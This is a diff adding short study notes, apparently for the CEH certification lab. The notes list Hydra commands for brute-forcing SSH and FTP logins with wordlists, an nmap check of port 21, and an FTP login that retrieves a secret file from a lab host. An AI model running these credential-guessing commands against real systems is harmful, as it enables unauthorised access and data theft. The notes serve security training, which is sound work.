@@ -1,0 +1,30 @@
+Hydra for SSH
+*******************************************************
+hydra -l user -p password <ip> ssh
+
+hydra -l user -P passlist.txt <ip> ssh
+
+hydra -l user -P passlist.txt ftp://10.10.10.10
+
+Hydra for FTP
+********************************************************
+#check if it is open or not
+  nmap -p 21 10.10.10.10 
+
+#To see if it is directly connecting or needing credentials)
+	ftp ip
+  ftp 10.10.10.10 
+  (asking credentials, bruteforce to get details)
+
+#get file
+  get filename
+  get secret.txt
+  
+#Then go to Desktop and in Ceh tools folder you will find wordlists, here you will find usernames and passwords file.
+#Now in terminal type  
+  
+  hydra -L /home/attacker/Desktop/CEH_TOOLS/Wordlists/Username.txt -P /home/attacker/Desktop/CEH_TOOLS/Wordlists/Password.txt ftp://10.10.10.10
+
+  hydra -l user -P passlist.txt ftp://10.10.10.10
+
+  hydra -L userlist.txt -P passlist.txt ftp://10.10.10.10
